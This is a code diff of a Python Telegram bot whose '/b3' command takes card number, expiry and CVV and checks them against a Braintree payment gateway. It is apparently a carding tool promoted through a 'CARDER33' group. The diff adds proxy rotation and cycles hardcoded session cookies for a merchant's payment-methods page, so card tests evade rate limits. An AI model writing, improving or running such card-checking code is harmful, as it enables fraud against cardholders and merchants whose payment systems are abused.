@@ -4351,13 +4351,35 @@ from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-
 from db import get_user, update_user  # credit system
 import urllib.parse
 import aiohttp
 import asyncio
 
+# --- Load proxies ---
+PROXIES_FILE = "proxies.txt"
+with open(PROXIES_FILE, "r") as f:
+    PROXIES_LIST = [line.strip() for line in f if line.strip()]
 
+proxy_index = 0
+proxy_lock = asyncio.Lock()
+
+async def get_next_proxy():
+    global proxy_index
+    async with proxy_lock:
+        if not PROXIES_LIST:
+            return None
+        proxy_str = PROXIES_LIST[proxy_index]
+        proxy_index = (proxy_index + 1) % len(PROXIES_LIST)
+        parts = proxy_str.split(":")
+        if len(parts) == 4:
+            host, port, user, password = parts
+            return f"http://{user}:{password}@{host}:{port}"
+        elif len(parts) == 2:
+            host, port = parts
+            return f"http://{host}:{port}"
+        else:
+            raise ValueError(f"Invalid proxy format: {proxy_str}")
 
 logger = logging.getLogger(__name__)
 BASE_COOLDOWN = 20  # Base cooldown in seconds
@@ -4382,6 +4404,7 @@ sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Lin
 sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Fpayment-methods%2F;
 _ga_GEWJ0CGSS2=GS2.1.s1757752336$o2$g1$t1757752459$j14$l0$h2070871103;'''
 
+    
     # --- Cookie 2 ---
     '''PHPSESSID=qftvknrnpks4u241irano91gbs;
 sbjs_migrations=1418474375998%3D1;
@@ -4397,14 +4420,11 @@ sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2F%3F
 cookieconsent_status=dismiss;
 mailpoet_page_view=%7B%22timestamp%22%3A1757749022%7D;
 _ga_GEWJ0CGSS2=GS2.1.s1757748816$o1$g1$t1757749035$j52$l0$h316575648;'''
-
 ]
-
 
 # --- Helper: Convert dict → raw cookie string (NO extra encoding) ---
 def cookies_dict_to_string(cookies: dict) -> str:
     return ";".join([f"{k}={v}" for k, v in cookies.items()])
-
 
 # --- Cookie rotation index ---
 cookie_index = 0
@@ -4417,36 +4437,8 @@ COOLDOWN_SECONDS = BASE_COOLDOWN // len(COOKIES_LIST)  # e.g., 2 cookies → coo
 def get_next_cookie():
     global cookie_index
     cookie = COOKIES_LIST[cookie_index]
-    cookie_index = (cookie_index + 1) % len(COOKIES_LIST)
-    # Flatten cookie
-    cookie = "; ".join(line.strip() for line in cookie.splitlines() if line.strip())
+    cookie_index = (cookie_index + 1) % len(COOKIES_LIST)  # rotate cookies
     return cookie
-
-
-
-# --- Load proxies ---
-PROXIES_FILE = "proxies.txt"
-with open(PROXIES_FILE, "r") as f:
-    PROXIES_LIST = [line.strip() for line in f if line.strip()]
-
-proxy_index = 0
-proxy_lock = asyncio.Lock()
-
-# --- Rotate proxies ---
-proxy_index = 0
-proxy_lock = asyncio.Lock()
-
-async def get_next_proxy():
-    global proxy_index
-    async with proxy_lock:
-        if not PROXIES_LIST:
-            return ""
-        proxy = PROXIES_LIST[proxy_index]
-        proxy_index = (proxy_index + 1) % len(PROXIES_LIST)
-        return proxy
-
-
-
 
 # --- Credit System ---
 async def consume_credit(user_id: int) -> bool:
@@ -4468,7 +4460,7 @@ async def b3(update: Update, context):
     # --- Check card args ---
     if not context.args:
         await update.message.reply_text(
-            "Usage: `/b3 cc|mm|yyyy|cvv`",
+            "Usage: /b3 cc|mm|yyyy|cvv",
             parse_mode=ParseMode.MARKDOWN
         )
         return  # no cooldown
@@ -4486,9 +4478,9 @@ async def b3(update: Update, context):
 
     # ✅ Set cooldown
     user_last_command_time[user_id] = current_time
-
     cc_input = context.args[0]
     full_card = cc_input
+
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
@@ -4500,9 +4492,7 @@ async def b3(update: Update, context):
         f"{bullet_link} <b>𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎...</b>"
     )
     processing_msg = await update.message.reply_text(
-        processing_text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
+        processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
     )
 
     # --- Run in background ---
@@ -4513,57 +4503,42 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-    # --- Rotate cookie and proxy ---
-    cookie = get_next_cookie()
-    proxy = await get_next_proxy()
-
-    # --- Clean cookie: remove newlines and extra spaces ---
-    cookie = " ".join(line.strip() for line in cookie.splitlines() if line.strip())
-
-    # --- Prepare API request params ---
+    # --- Prepare API request ---
     params = {
         "key": API_KEY,
         "site": SITE,
-        "cookies": cookie,
-        "cc": cc_input,
-        "proxy": proxy
+        "cookies": get_next_cookie(),  # rotate cookie
+        "cc": cc_input
     }
-
-    # --- Log full API request URL ---
-    encoded_params = urllib.parse.urlencode(params)
-    full_api_url = f"{API_URL}?{encoded_params}"
-    logger.info(f"[DEBUG] Full API Request URL: {full_api_url}")
 
     try:
         timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
+            proxy_url = await get_next_proxy()  # rotate proxy
+            logger.info(f"[DEBUG] Using proxy: {proxy_url}")
             try:
-                # Call API (params are URL-encoded)
-                async with session.get(API_URL, params=params) as resp:
+                async with session.get(API_URL, params=params, proxy=proxy_url) as resp:
                     if resp.status != 200:
                         await processing_msg.edit_text(
-                            f"❌ API returned HTTP {resp.status}",
+                            f"❌ API returned HTTP {resp.status} via proxy {proxy_url}",
                             parse_mode=ParseMode.HTML
                         )
                         return
-
                     try:
                         data = await resp.json(content_type=None)
                     except Exception:
                         text = await resp.text()
                         await processing_msg.edit_text(
-                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>",
+                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>\nProxy: {proxy_url}",
                             parse_mode=ParseMode.HTML
                         )
                         return
-
             except Exception as e:
                 await processing_msg.edit_text(
-                    f"❌ Request error:\n<code>{escape(str(e))}</code>",
+                    f"❌ Request error:\n<code>{escape(str(e))}</code>\nProxy: {proxy_url}",
                     parse_mode=ParseMode.HTML
                 )
                 return
-
     except asyncio.TimeoutError:
         await processing_msg.edit_text(
             "❌ Request timed out after 50 seconds.",
@@ -4614,24 +4589,19 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     final_msg = (
         f"◇━━〔 {stylish_status} 〕━━◇\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝘄𝗮𝗒 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝗿𝗲𝗲 𝑷𝒓𝗲𝗺𝗶𝘂𝗺 𝑨𝒖𝒕𝗵\n"
-        f"{bullet_link} 𝐑𝐞𝐬𝐩𝗼𝗻𝗌𝗲 ➵ <i>{escape(response)}</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑨𝒖𝒕𝒉\n"
+        f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{escape(response)}</i>\n"
         "――――――――――――――――\n"
-        f"{bullet_link} 𝐁𝐫𝐚𝗻𝗱 ➵ <code>{escape(brand)}</code>\n"
-        f"{bullet_link} 𝐁𝗮𝗻𝗸 ➵ <code>{escape(issuer)}</code>\n"
-        f"{bullet_link} 𝐂𝗼𝗎𝗻𝘁𝗿𝘆 ➵ <code>{escape(country_name)} {country_flag}</code>\n"
+        f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
+        f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{escape(issuer)}</code>\n"
+        f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{escape(country_name)} {country_flag}</code>\n"
         "――――――――――――――――\n"
-        f"{bullet_link} 𝐑𝐞𝗾𝘂𝗲𝘀𝘁 𝐁𝘆 ➵ {requester}\n"
-        f"{bullet_link} 𝐃𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 ➵ {developer_clickable}\n"
+        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
+        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
         "――――――――――――――――"
     )
-
     try:
-        await processing_msg.edit_text(
-            final_msg,
-            parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True
-        )
+        await processing_msg.edit_text(final_msg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     except Exception as e:
         logger.exception("Error editing final message")
 
